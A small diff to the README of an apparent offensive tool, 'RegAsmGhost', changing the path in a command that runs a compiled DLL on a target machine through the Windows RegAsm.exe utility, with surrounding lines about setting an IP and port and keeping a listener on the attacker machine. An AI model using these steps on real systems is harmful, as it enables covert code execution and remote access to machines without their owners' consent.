@@ -11,7 +11,7 @@ First, Adjust the IP address and port number directly in RegAsmGhost.cs to suit 
 Then, place the compiled DLL on the target machine and execute it using the following command:
 
 ```powershell
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U RegAsmGhost.dll
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U .\RegAsmGhost.dll
 ```
 
 Ensure your listener is active on your attacker machine:
